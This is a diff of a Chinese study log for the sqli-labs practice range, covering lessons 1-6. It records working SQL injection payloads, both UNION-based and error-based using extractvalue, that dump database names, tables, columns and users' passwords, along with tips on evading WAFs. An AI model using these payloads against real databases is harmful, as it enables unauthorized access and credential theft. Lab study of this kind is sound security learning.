@@ -1,5 +1,7 @@
 # sqli靶场学习
 
+[推荐参考的sql注入教程](https://www.bilibili.com/video/BV1c34y1h7So)
+
 ## sqli-less1
 
 ![](./images/sqli1_1.png)
@@ -122,13 +124,13 @@ select 1,group_concat(username),group_concat(password) from security.users --+
 
 ![](./images/sqli2_5.png)
 发现可以使用union联合注入，输入如下语句
-```
+```sql
 ?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata LIMIT 0, 1 --+
 ```
 ![](./images/sqli2_6.png)
 得到所有数据库的名称：information_schema,challenges,mysql,performance_schema,security,sys
 
-```
+```sql
 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ LIMIT 0,1
 ```
 ![](./images/sqli2_7.png)
@@ -153,17 +155,126 @@ SELECT * FROM users WHERE id='-1'union select 1,group_concat(username),group_con
 > 2. 判断注入类型
 > 3. 判断字段数
 > 4. 获得数据库名称
-> 5. 获得列名
-> 6. 获取数据
+> 5. 获得数据表名
+> 6. 获得列名
+> 7. 获取数据
 
+---
+## 再次做完前两less后的总结（侧重思路）
+1.还是先判断注入点和注入类型
+2.判断字段数，这里可以使用order by（常见但容易被waf封）也可以使用group by（不易被waf封但用的时候可能会出现问题），注释小知识：可以用'--+'或'#'，看具体情况使用，亦或者可以使用'%23'
+3.看看是否可以用 union联合注入，同时判断回显的位
+4.在可以回显的位置尝试用database（）函数，可以直接爆当前所在库名，亦或者可以使用union select 1,group_concat(schema.name),3 from infomation.schema.schemata获得所有库名
+5.用table_name,information_schema.tables，where table_schema='' 来获得表名
+6.用column_name,information_schema.columns 来获得列名
+7.用已经获得的表名和列名直接获取信息
+
+---
 ## sqli-less3
 
-从这里开始我尝试使用burp进行sql注入，从而使注入语句显示更加直观
-![](./images/sqli3_1.png)
-![](./images/sqli3_2.png)
-![](./images/sqli3_3.png)
-判断发现需要闭合，判断闭合方式
+![alt text](./images/image.png)
+![alt text](./images/image-1.png)
+判断出是字符型，接下来判断闭合方式，尝试用'闭合
+![alt text](./images/image-2.png)
+发现报错如下，证明是'+）
+![alt text](./images/image-3.png)
+证明闭合方式是')，接下来与前两节方式一样
+![alt text](./images/image-4.png)
+![alt text](./images/image-5.png)
+![alt text](./images/image-6.png)
+![alt text](./images/image-7.png)or![alt text](./images/image-8.png)
+![alt text](./images/image-9.png)
+![alt text](./images/image-10.png)
+![alt text](./images/image-11.png)
 
-![](./images/sqli3_4.png)
-![](./images/sqli3_5.png)
-发现在单引号闭合后报错，
+![源码中的sql语句](./images/image-12.png)
+
+## sqli-less4
+
+![alt text](./images/image-13.png)
+![alt text](./images/image-14.png)
+判断出是字符型，接下来判断闭合方式
+![alt text](./images/image-15.png)
+![alt text](./images/image-16.png)
+发现报错信息，判断闭合方式是"+)
+![alt text](./images/image-17.png)
+后面的方式与前三课一样
+![alt text](./images/image-18.png)
+![alt text](./images/image-19.png)
+![alt text](./images/image-20.png)
+![alt text](./images/image-21.png)
+![alt text](./images/image-22.png)
+
+![源码中的sql语句](./images/image-23.png)
+
+## sqli-less5
+
+![alt text](./images/image-24.png)
+![alt text](./images/image-25.png)
+![alt text](./images/image-26.png)
+发现没有像前三课一样直接回显的是用户的信息
+![alt text](./images/image-27.png)
+根据报错，判断是单引号闭合
+![alt text](./images/image-28.png)
+接下来判断字段数
+![alt text](./images/image-29.png)
+![alt text](./images/image-30.png)
+得知字段数有3个
+![alt text](./images/image-31.png)
+正常的命令执行了但没有显示，那就尝试改成不正确的命令试试
+![alt text](./images/image-32.png)
+判断出当前数据库的库名是security
+或者可以使用
+```sql
+union select 1,2,extractvalue(1,concat(0x7e,(select database())))
+#知识点：extractvalue()是报错注入中常用的函数。
+#作用：从XML片段中提取指定的值。
+#示例：SELECT EXTRACTVALUE('<root><tag>value</tag></root>', '/root/tag'); 返回 value。其中'<root><tag>value</tag></root>'可以认为是标签tag，'/root/tag'则可认为是路径
+#用途：在报错注入中，可以传递无效的XML路径或结构来触发错误。
+#concat(1,2)将‘1,2’拼接到一块
+#0x7e，是'~'的ascii的十六进制表示，因为用extractvalue()时，路径的前面有'~'时则会将路径报错返回
+```
+![alt text](./images/image-33.png)
+
+```sql
+union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))--+
+```
+可以通过这个sql语句利用extractvalue()报错来获得表名
+![alt text](./images/image-34.png)
+
+```sql
+union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')))--+
+```
+同理利用相同的语句构造可以获得列名
+![alt text](./images/image-35.png)
+
+同理获得表的数据
+![alt text](./images/image-36.png)
+此处发现返回数据不全，原因是extractvalue()函数的回显只能有32个字符
+> 解决方法：使用**substring(x,y,z)**，其中x为控制输出的字符串,y为开始显示的字符的位置，z为显示字符的个数
+
+```sql
+union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,'~',password)from security.users),1,30)))--+
+```
+![alt text](./images/image-37.png)
+同理可以得到其他本来无法显示的数据
+![alt text](./images/image-38.png)
+
+这一节还可以利用updatexml()函数，下一节用updatexml
+
+## sqli-less6
+
+![alt text](./images/image-39.png)
+![alt text](./images/image-40.png)
+![alt text](./images/image-41.png)
+![alt text](./images/image-42.png)
+判断出闭合方式是"
+![alt text](./images/image-43.png)
+![alt text](./images/image-44.png)
+![alt text](./images/image-46.png)
+![alt text](./images/image-45.png)
+![alt text](./images/image-47.png)
+![alt text](./images/image-48.png)
+![alt text](./images/image-49.png)
+
+[推荐参考的sql注入教程](https://www.bilibili.com/video/BV1c34y1h7So)
